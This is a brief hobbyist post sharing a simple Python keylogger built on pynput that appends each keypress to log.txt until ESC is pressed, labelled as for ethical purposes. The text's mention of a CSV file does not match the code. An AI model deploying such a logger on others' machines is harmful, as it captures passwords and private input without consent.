Key Logger

*USED FOR ETHICAL PURPOSES*

This a python script I did in order to make a key logger that will record your keyboard inputs and put the inputs into a different CSV file.

Code:

from pynput import keyboard

def on_press(key):
    try:
        with open("log.txt", 'a') as log_file:
            log_file.write(f"{key}\n")
    except Exception as e:
        print(f"Write error: {e}")
        
    if key == keyboard.Key.esc:
        print("\n[!] Listener stopped")
        return False
    
def main():
    print("[+] Listener running... (press ESC to stop)")
    with keyboard.Listener(on_press=on_press) as listner:
        listner.join()
        
if __name__ == "__main__":
    main()
